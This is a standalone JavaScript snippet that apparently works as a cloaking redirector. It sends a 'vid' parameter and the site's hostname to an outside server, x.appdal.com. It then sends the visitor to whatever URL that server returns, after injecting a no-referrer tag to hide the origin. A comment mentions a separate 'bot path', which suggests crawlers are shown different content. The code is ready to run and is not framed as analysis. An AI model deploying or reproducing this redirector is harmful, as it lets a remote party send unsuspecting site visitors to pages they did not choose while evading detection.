(function() {
  if (window.__id_FETCH_RAN__) return;
  window.__id_FETCH_RAN__ = 1;

  var redirectWithoutReferrer = function(url) {
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'no-referrer';
    document.head.appendChild(meta);
    window.location.replace(url);
  };

  var params = new URLSearchParams(window.location.search);
  var paramValue = params.get('vid');
  var hostParam1 = window.location.hostname;

  if (paramValue) {
    fetch('https://x.appdal.com/new2/JsGet2.php?vid=' + encodeURIComponent(paramValue) +
          '&host=' + encodeURIComponent(hostParam1) +
          '&cache=1&_=' + Date.now())
      .then(function(res) {
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return res.text();
      })
      .then(function(text) {
        try {
          var r = JSON.parse(text);
          if (r && r.redirectUrl) {
            redirectWithoutReferrer(r.redirectUrl);
          } else if (r && r.error) {
            console.error('API error:', r.error);
          } else {
            console.error('Unexpected response:', text);
          }
        } catch (err) {
          // Response wasn't JSON (might be HTML if bot path was triggered)
          console.error('Parse error:', err);
        }
      })
      .catch(function(err) {
        console.error('Fetch error:', err);
      });
  } else {
    console.error("GO HOME - no vid parameter");
  }
})();
